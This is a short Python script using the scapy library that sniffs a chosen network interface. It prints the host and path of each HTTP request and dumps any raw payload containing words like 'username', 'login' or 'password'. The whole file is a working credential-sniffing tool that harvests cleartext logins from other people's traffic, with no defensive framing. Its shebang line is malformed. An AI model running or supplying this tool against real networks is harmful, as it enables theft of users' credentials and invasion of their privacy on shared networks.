#!usr/src/bin python3
import scapy.all as scapy
from scapy.layers import http
import argparse


# function to get arguments from the user
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the name of the interface to be sniffed")
    options = parser.parse_args()
    if not options.interface:
        parser.error("Specify the name of the interface or use --help for more information")
    else:
        return options.interface


# function to sniff the interface with traffic
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniff_packet)


# function to process the captured packets while sniffing
def sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        credentials = get_credentials(packet)
        if credentials:
            print("\n\nUsername & Password >> " + str(credentials) + "\n\n")


# function to return the URLs captured while sniffing
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# function to return the credentials captured while sniffing
def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# main code
interface = get_arguments()
sniff(interface)
